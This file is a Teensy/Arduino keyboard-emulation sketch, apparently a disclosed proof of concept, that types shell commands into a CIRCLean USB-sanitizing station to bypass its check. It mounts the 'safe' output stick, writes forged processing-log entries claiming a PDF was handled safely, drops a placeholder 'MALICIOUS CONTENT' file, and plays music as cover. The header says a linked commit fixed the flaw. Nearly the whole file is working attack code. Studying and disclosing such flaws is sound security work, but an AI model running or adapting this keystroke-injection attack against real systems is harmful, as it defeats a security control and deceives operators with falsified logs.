/*
   Code for Teensy - Configure your Teensy as a Keyboard
   This code will bypass CIRCLean security check and let you drop a malicious file on the "safe" USB Stick
   Fixed by this commit: https://github.com/CIRCL/Circlean/commit/960f98dd36ff8fcaf7327e089b0da70a6eb1bc91
*/

#include <Keyboard.h>

void keyboardEntry(String commandLine) {
  Keyboard.println(commandLine);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll() ;
  delay(500);
}

void setup() {
  delay(50000);
  Keyboard.begin();
  keyboardEntry("/usr/bin/timidity /opt/midi/sepultura-refuse_resist.mid & ");
  keyboardEntry("echo $! > /tmp/music.pid");
  keyboardEntry("pmount /dev/sda1");
  keyboardEntry("mkdir -p /media/sda1/FROM_PARTITION_1/logs");  
  keyboardEntry("echo '2015-02-16T14:03:17Z:INFO:files|Processing safe_pdf.pdf (application/pdf)' > /media/sda1/FROM_PARTITION_1/logs/processing.log");
  keyboardEntry("echo '2015-02-16T14:03:30Z:DEBUG:files:extension=.pdf:filepath=/media/src/safe_pdf.pdf:maintype=application:processing_type=pdf:subtype=pdf|Application file' >> /media/sda1/FROM_PARTITION_1/logs/processing.log");
  keyboardEntry("echo 'MALICIOUS CONTENT' > /media/sda1/FROM_PARTITION_1/safe_pdf.pdf.html");
  keyboardEntry("pumount /dev/sda1");
  delay(5000);
  keyboardEntry("kill -9 $(cat /tmp/music.pid)");
}

void loop() {}



